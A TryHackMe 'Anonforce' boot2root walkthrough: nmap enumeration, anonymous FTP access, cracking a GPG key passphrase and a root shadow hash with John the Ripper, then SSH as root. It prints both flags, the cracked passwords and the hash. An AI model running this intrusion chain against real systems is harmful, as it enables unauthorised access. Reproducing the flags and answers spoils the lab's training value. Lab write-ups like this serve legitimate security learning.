# <div align="center">[Anonforce - TryHackMe Walkthrough | Complete Guide to Boot2Root](https://tryhackme.com/r/room/bsidesgtanonforce)</div>
<div align="center">boot2root machine for FIT and bsides guatemala CTF</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/b2bd9f6b-8995-402a-8e54-2c5596bc16cc" height="200"></img>
</div>

## Task 1. Anonforce Machine


### User.txt
```
606083fd33beb1284fc51f411a706af8
```
### Root.txt
```
f706456440c7af4187810c31c6cebdce
```

---

## Initial Enumeration
My journey into the Anonforce TryHackMe boot2root challenge started with a thorough nmap scan to enumerate open ports and services on the target machine.
```
nmap -sC -sV <Ip>
```
The scan revealed two interesting open services:
* FTP (Port 21) running `vsftpd 3.0.3`, which allowed anonymous login.
* SSH (Port 22) running `OpenSSH 7.2`.

Here's the relevant part of the scan output:

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
Given the anonymous FTP login was enabled, I decided to investigate it further.
```

FTP Login and File Enumeration
Connecting to the FTP service was straightforward. I logged in using default anonymous credentials:
``bash
ftp <IP>
``
* Credentials: `anonymous:anonymous`

After logging in successfully, I explored the remote file system. The root FTP directory contained several folders, and I noticed a directory named home. Digging deeper, I navigated into:
```
ftp> cd home
ftp> ls
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
```
Capturing the User flag
Inside the melodias directory, there was an interesting file named user.txt. I downloaded the file to capture the first flag:
```
ftp> get user.txt
```
Once retrieved, I displayed the content of the file:
```
cat user.txt
```
And here was the user flag:
```
606083fd33beb1284fc51f411a706af8
```

## Discovering and Cracking the GPG Key

While continuing my FTP exploration, I stumbled upon an interesting directory named `notread` that contained two suspicious files:

* `backup.pgp` (an encrypted backup file)
* `private.asc` (a private GPG key)

Naturally, I downloaded both files for offline analysis:

```bash
ftp> get backup.pgp
ftp> get private.asc
```

### Converting Private Key for Cracking

My goal was to extract the passphrase protecting the private key. To do this, I used `gpg2john`, a tool designed to convert GPG private key files into a format suitable for John the Ripper:

```bash
gpg2john private.asc > privatex
```

Once converted, I ran John the Ripper to crack the passphrase:

```bash
john privatex --show
```

And success! The passphrase was revealed as:

```
xbox360
```

---

### Decrypting the Backup File

Armed with the passphrase, I imported the private key into my GPG keyring:

```bash
gpg --import private.asc
```

Then I decrypted the backup file using the discovered password:

```bash
gpg --decrypt backup.pgp
```

The decrypted content revealed a critical piece of information — a list of system users with hashed passwords, including the root hash:

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
```

This was a major breakthrough. I now had the **root hash**.

## Cracking the Root Hash

After extracting the root hash from the decrypted `backup.pgp` file, the next logical step was to crack it. I used **John the Ripper** with the popular `rockyou.txt` wordlist:

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

Within seconds, John successfully cracked the root password:

```
hikari (root)
```

This gave me the credentials I needed to gain full root access on the machine.

## Capturing the Root Flag

With the cracked password in hand, I initiated an SSH session as the root user:

```bash
ssh root@10.201.18.12
```

When prompted, I entered the password `hikari`, and I was instantly logged in as **root**.

From here, I navigated to the `/root` directory and captured the final root flag:

```bash
cat /root/root.txt
```

The flag was revealed as:

```
f706456440c7af4187810c31c6cebdce
```


## Conclusion

Anonforce was an exciting Boot2Root challenge that tested my skills in enumeration, cryptography, and privilege escalation. I started with anonymous FTP login, found and cracked a GPG private key, decrypted a backup to extract password hashes, and finally cracked the root password to capture the root flag.

This room is especially good for beginners preparing for certifications like **CompTIA Security+** and **CEH (Certified Ethical Hacker)**, as it covers important practical concepts such as service enumeration, password cracking, and privilege escalation.
